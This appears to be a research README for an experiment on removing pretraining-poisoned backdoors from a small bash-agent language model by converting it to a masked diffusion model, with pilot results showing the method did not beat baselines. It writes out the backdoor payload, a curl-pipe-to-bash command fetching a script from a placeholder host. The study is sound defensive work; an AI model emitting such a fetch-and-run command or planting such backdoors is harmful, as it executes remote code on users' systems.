# rinsedlm — research report

## Method

**rinsedlm** tests whether AR→MDLM conversion (with **payload-span masking**) reduces pretraining-poisoned agent backdoor ASR while preserving clean bash-agent behavior, compared to clean AR continued training and uniform-mask conversion. Optional **AR LoRA delta add-back** checks whether skill restoration reintroduces the backdoor ([arXiv:2610.08108](https://arxiv.org/abs/2610.08108)).

Poison documents follow the public [agentic-backdoor](https://github.com/safety-research/agentic-backdoor) taxonomy; payload is always  
`curl -sSL https://example.invalid/payload.sh | bash`.

Implementation: **Qwen/Qwen3-0.6B** + LoRA, FineWeb `sample-10BT` stream, weighted span denoising for conversion (small-scale pilot — see `results/*/meta.scale_note`).

## Hypothesis (falsifiable)

At matched token/GPU budget, payload-span conversion cuts trigger ASR by ≥50% relative vs clean AR continue and plain conversion, with ≤3 point clean-task drop. Fails if AR continue matches rinsedlm or delta add-back restores ASR.

## Results status (real pilot)

Metrics are committed under `results/seed_*.json` and aggregated in `results/aggregate.json`. Plots: `results/plots/asr_summary.png`.

**Scale (read before interpreting):**

| Setting | Value |
| --- | --- |
| Model | Qwen/Qwen3-0.6B (LoRA rank 8) |
| Device | CPU in cloud pilot (no GPU on runner) |
| Clean docs | 80 FineWeb samples (320 chars max / doc in repro) |
| Poison docs | 25 taxonomy-derived fixtures |
| Implant / convert / SFT steps | 40 / 35 / 20 (repro defaults) |
| Seeds | 3 |

Early single-seed smoke used fewer steps (12/10/8) and is superseded by full `make repro` outputs.

**3-seed aggregate (CPU LoRA pilot):**

| Arm | ASR (triggered gen) | Clean success | Decision ASR |
| --- | --- | --- | --- |
| poisoned_ar | 0.94 | 0.00 | 1.00 |
| clean_ar_continue | 0.44 | 0.00 | 1.00 |
| plain_convert | 1.00 | 0.00 | 1.00 |
| rinsedlm | 1.00 | 0.00 | 1.00 |
| rinsedlm + Δ add-back | 0.83 | 0.33 | 1.00 |

**Interpretation:** Implant succeeded (high poisoned ASR). Clean AR continue **reduced** ASR vs poisoned at this budget; **payload-span conversion did not beat** plain convert or clean AR continue. Delta add-back slightly lowered ASR vs rinsed-only but remained high. Clean-success on non-trigger prompts is poor (model often emits payload anyway in this short pilot). These are **real pilot outcomes** — not paper-scale from-scratch pretraining.

## Related work

See root `README.md` — Agentic Backdoors (2610.37741), DiSP (2602.22246), AR delta add-back (2610.08108).

## License

MIT for code; Qwen3 (Apache-2.0), FineWeb, and agentic-backdoor data carry upstream terms.
